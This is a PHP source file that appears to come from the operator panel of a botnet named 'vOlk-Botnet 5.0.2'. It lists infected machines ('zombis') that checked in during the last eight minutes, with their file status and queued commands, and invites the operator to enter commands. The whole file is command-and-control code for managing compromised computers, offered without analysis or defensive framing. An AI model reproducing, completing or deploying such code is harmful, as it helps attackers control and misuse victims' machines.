<?php @session_start(); if ( !isset($_SESSION['login']) ){ header ("Location: ../../");  exit() ; }	?>
<?php 
require_once('../../includes.php'); 

$f = date("Y-m-d"); ;
$h = date("H:i:s"); ;
$h2 = date("H:i:s",strtotime("-8 minute")); 


$Zombis = $DB->Select("SELECT * FROM zombis");
$Online = $DB->Select("SELECT * FROM zombis WHERE time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" , 'num_rows' , false);
$Totales = $DB->Select("SELECT * FROM zombis" , 'num_rows' , false);
$NroRegistros = @mysql_num_rows(@mysql_query("SELECT * FROM zombis"));

for($i=0; $i<count($Zombis); $i++){
$Sql_3 = "SELECT * FROM zombis WHERE id='".$Zombis[$i]['id']."' AND time(fecha) > '".$h2."' AND time(fecha) < '".$h."'" ;
$ZombieOnline = $DB->Select($Sql_3 , 'num_rows' , false);
if( $ZombieOnline > 0 ){
	$ZMB .= "#[".$Zombis[$i]['name']."]-[File Status = ".$Zombis[$i]['infos']."]-[Commands = ".$Zombis[$i]['cmds']."]\n";
  } 
}


?>
<?php echo "===========================================\n[vOlk-Botnet 5.0.2 ' Enter the commands]\n===========================================\n\n\n"; ?>
<?php echo $ZMB ; ?>
